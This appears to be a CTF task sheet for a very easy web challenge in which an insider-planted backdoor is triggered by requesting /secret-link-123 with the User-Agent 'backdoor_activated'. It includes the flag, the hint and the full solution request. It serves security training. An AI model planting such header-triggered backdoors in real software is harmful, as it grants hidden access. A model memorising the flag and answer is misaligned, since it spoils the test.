## Backdoor

### Category
Web

### Points
very easy

### Task description
Инсайдер внедрил бэкдор, воспользуйся им.
http://IP:PORT

@baydarich

### Flag
kaiCTF{6416729ed223358d2a2cad6dc3a5ac63}

### Hint
change your User-Agent

### Info

Provide only web service link to the participants, no files required.
Go to `ready` folder and run:
```
docker build --tag backdoor-task .
docker run -d -p 31338:31338 backdoor-task
```

### Solution
```
GET /secret-link-123 HTTP/1.1
Host: <host>
User-Agent: backdoor_activated

```